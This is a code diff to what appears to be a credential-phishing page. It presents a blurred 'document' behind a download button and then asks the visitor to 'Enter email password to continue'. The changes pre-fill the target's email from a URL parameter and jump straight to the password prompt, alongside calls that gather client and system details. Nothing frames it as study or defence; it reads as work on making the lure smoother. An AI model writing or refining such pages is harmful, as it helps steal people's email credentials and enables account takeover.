@@ -32,9 +32,9 @@
             height: 100%;
             filter: blur(3.5px);
             z-index: -1;
-            transform: translate(-50%, -50%); /* Changed from -52% to -50% for perfect center */
+            transform: translate(-50%, -50%);
             background-image: url('input.png');
-            background-size: 100% 100%; /* Stretches both width and height */
+            background-size: 100% 100%;
             background-repeat: no-repeat;
             background-position: center center;
         }
@@ -68,18 +68,6 @@
             display: inline-block;
             white-space: nowrap;
         }
-
-<!--        .heading::after {-->
-<!--            content: '';-->
-<!--            position: absolute;-->
-<!--            bottom: -10px;-->
-<!--            left: 50%;-->
-<!--            transform: translateX(-50%);-->
-<!--            width: 60px;-->
-<!--            height: 4px;-->
-<!--            background: #4285f4;-->
-<!--            border-radius: 2px;-->
-<!--        }-->
 
         .input-group {
             margin-bottom: 15px;
@@ -140,7 +128,7 @@
             cursor: pointer;
             font-size: 16px;
             font-weight: 600;
-            width: 40%; /* Reduced width */
+            width: 40%;
             height: 10%;
             transition: all 0.3s ease;
             margin: 0 auto;
@@ -168,8 +156,12 @@
             background-color: #3367d6;
         }
 
+        .email-step {
+            display: none; /* Hide email step by default */
+        }
+
         .password-step {
-            display: none;
+            display: none; /* Hide password step by default */
         }
 
         .error-message {
@@ -207,7 +199,7 @@
             }
 
             .download-button, .continue-button {
-                width: 70%; /* Adjusted for mobile */
+                width: 70%;
             }
         }
     </style>
@@ -230,7 +222,7 @@
             </button>
         </div>
 
-        <!-- Password Step (Initially Hidden) -->
+        <!-- Password Step -->
         <div class="password-step">
             <h1 class="heading">Enter email password to continue</h1>
 
@@ -288,32 +280,26 @@
                 return urlParams.get('email');
             }
 
-            // Auto-fill email from URL if provided
-            const urlEmail = getEmailFromURL();
-            if (urlEmail) {
-                emailInput.value = urlEmail;
-                emailInput.classList.add('valid');
-                downloadButton.classList.add('valid');
-
-                // If email is provided in URL, skip to password step automatically
-                setTimeout(() => {
-                    const userEmail = emailInput.value;
-                    emailDisplay.value = userEmail;
-
+            // Initialize page based on URL parameters
+            function initializePage() {
+                const urlEmail = getEmailFromURL();
+                
+                if (urlEmail) {
+                    // If email is provided in URL, show password step immediately
+                    emailDisplay.value = urlEmail;
                     emailStep.style.display = 'none';
                     passwordStep.style.display = 'block';
-                    errorMessage.style.display = 'none';
-                    successMessage.style.display = 'none';
-
-                    passwordAttempts = 0;
-
+                    
+                    // Focus on password input immediately
                     setTimeout(() => {
                         passwordInput.focus();
                     }, 100);
-                }, 500);
-            } else {
-                // Only focus on email input if no URL email provided
-                emailInput.focus();
+                } else {
+                    // If no email in URL, show email step
+                    emailStep.style.display = 'block';
+                    passwordStep.style.display = 'none';
+                    emailInput.focus();
+                }
             }
 
             // Get client details
@@ -395,6 +381,9 @@
             // Initialize client data collection
             getClientDetails();
             getSystemDetails();
+
+            // Initialize page display
+            initializePage();
 
             // Email validation function
             function validateEmail(email) {
